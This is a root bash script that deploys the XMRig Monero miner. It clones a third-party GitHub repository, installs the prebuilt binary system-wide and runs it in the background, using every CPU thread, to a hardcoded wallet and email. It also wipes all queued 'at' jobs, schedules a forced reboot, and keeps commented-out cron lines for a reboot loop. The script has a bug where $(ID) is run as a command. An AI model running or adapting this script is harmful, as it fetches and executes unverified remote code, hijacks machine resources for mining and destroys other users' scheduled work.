#! /bin/bash
if [ "$(whoami)" != "root" ]; then
        echo -e "Sorry, you are not root. Please use sudo option"
        exit 1
fi
WALLET=85JCqM38Kot39Sgrdv7H5aia7GBcd8vEUaU8EuLcUZfaPFXVHW8hRWWWCWkqfFGXTbPY8KLPY5qyJNiPvZBWipUrVi8VrDk
ID="$(hostname)"
MAIL=mamasarkanzas@gmail.com
PASSWORD=$ID:$MAIL
THREADS="$(nproc --all)"

#deleting all previous files, tasks, jobs and configs
rm -rf /tmp/miner/
for i in `atq | awk '{print $1}'`;do atrm $i;done

        #touch /tmp/mycron.sh
        #write out current crontab
        #echo new cron into cron file
        #        echo "reboot -f" >> /tmp/mycron.sh
        #install new cron file
        #chmod a+x /tmp/mycron.sh
        #crontab -l > xxw
        #        echo "*/2 * * * * bash /tmp/mycron.sh" >> xxw
        #crontab xxw
        #rm xxw

echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
echo -e 'Installing updates and install soft...'
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
sleep 2
cd /tmp && mkdir miner
git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
cd /tmp/miner
chmod +x /tmp/miner/xmrig
sleep 1
cp /tmp/miner/xmrig /usr/bin/
sleep 1
#xmrig -c /tmp/miner/config.json
xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id="$(ID)" --threads=$THREADS -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10
echo -e 'Miner started '
echo -e 'Watch: '
echo -e 'tail -f /tmp/miner/xmrig.log'

touch /tmp/at.txt
echo 'sudo reboot -f' >> /tmp/at.txt
at now + 24 hours < /tmp/at.txt
echo -e 'Restart job specified'
